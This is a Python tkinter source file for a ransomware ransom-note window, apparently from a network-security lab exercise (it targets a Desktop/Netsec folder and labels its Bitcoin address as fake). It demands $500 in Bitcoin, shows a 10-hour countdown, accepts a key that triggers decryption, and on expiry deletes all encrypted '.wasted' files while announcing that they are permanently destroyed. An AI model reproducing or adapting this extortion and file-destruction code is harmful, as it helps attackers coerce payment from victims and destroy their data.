from tkinter import Tk, Frame, Label, Button, StringVar, messagebox, Entry
import threading
import time
import os
import platform
from maindecrypt import decrypt
import discover  # Make sure this exists

class MainWindow(Tk):
    def __init__(self, encrypted_key_b64):
        super().__init__()

        self.title("!!! Your Files Are Locked !!!")
        self.geometry("800x650")
        self.configure(background='black')  
        self.resizable(False, False)

        self.encrypted_key_b64 = encrypted_key_b64

        # Exit shortcut
        self.bind("<Escape>", lambda e: self.destroy())
        self.bind("<Control-Alt-q>", lambda e: self.destroy())

        # Main frame
        main_frame = Frame(self, background='black')
        main_frame.pack(expand=True)

        # Warning Message
        Label(main_frame, text="Your important files have been encrypted!",
              wraplength=700, font='Helvetica 20 bold',
              foreground='red', background='black', pady=20).pack()

        Label(main_frame, text="To recover your files, you must pay:",
              wraplength=700, font='Helvetica 16',
              foreground='white', background='black').pack()

        # Amount
        Label(main_frame, text="$500 USD worth of Bitcoin (BTC)",
              font='Helvetica 22 bold', fg='yellow', bg='black', pady=10).pack()

        # BTC address (fake)
        Label(main_frame, text="Send BTC to the following address:",
              font='Helvetica 14', fg='white', bg='black').pack(pady=(20, 5))

        Label(main_frame, text="1BoatSLRHtKNngkdXEeobR76b53LETtpyT",
              font='Helvetica 16 bold', fg='lightgreen', bg='black').pack(pady=(0, 20))

        # Timer
        Label(main_frame, text="Time Remaining before permanent loss:",
              font='Helvetica 16 bold', fg='red', bg='black').pack()

        self.time_left_var = StringVar(value="600:00")
        Label(main_frame, textvariable=self.time_left_var, font='Helvetica 28 bold',
              foreground='red', background='black').pack(pady=(0, 20))

        # Key Entry
        Label(main_frame, text="After payment, enter your recovery key below:",
              font='Helvetica 14', fg='white', bg='black').pack(pady=(10, 5))

        self.key_var = StringVar()
        Entry(main_frame, textvariable=self.key_var, font='Helvetica 14', width=50).pack(pady=5)

        # Buttons
        button_frame = Frame(main_frame, background='black')
        button_frame.pack(pady=20)

        Button(button_frame, text="Check Payment and Decrypt", command=self.manual_decrypt,
               font='Helvetica 14 bold', bg='lightgreen', padx=20, pady=5).grid(row=0, column=0, padx=10)

        Button(button_frame, text="Exit", command=self.destroy,
               font='Helvetica 14 bold', bg='red', padx=20, pady=5).grid(row=0, column=1, padx=10)

        # Start countdown timer
        threading.Thread(target=self.start_timer, daemon=True).start()

    def manual_decrypt(self):
        key = self.key_var.get().strip()
        if not key:
            messagebox.showerror("Missing Key", "Please enter your recovery key after payment.")
            return
        try:
            decrypt(key)
            messagebox.showinfo("Success", "Payment verified. Files successfully recovered.")
            self.destroy()
        except Exception as e:
            messagebox.showerror("Recovery Failed", f"Error: {e}")

    def start_timer(self):
        s = 600 * 60  # 10 hours
        while s != -1:
            mins, secs = divmod(s, 60)
            self.time_left_var.set(f"{mins:02d}:{secs:02d}")
            time.sleep(1)
            s -= 1

        print("[*] Time expired. Cleaning up files...")
        self.destroy_files()

    def destroy_files(self):
        if platform.system() in ["Linux", "Darwin"]:
            startdirs = [os.environ.get('HOME', '') + '/Desktop/Netsec']
        else:
            startdirs = [os.environ.get('USERPROFILE', '') + '\\Desktop\\Netsec']

        extension = ".wasted"
        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir):
                if file.endswith(extension):
                    try:
                        os.remove(file)
                        print(f"[Deleted] {file}")
                    except Exception as e:
                        print(f"[Error] Could not delete {file}: {e}")

        messagebox.showinfo("Notice", "Time expired. Your files have been permanently destroyed.")
        self.destroy()

# Run GUI
if __name__ == "__main__":
    encrypted_key = "YourEncryptedKeyHere"
    app = MainWindow(encrypted_key)
    app.mainloop()
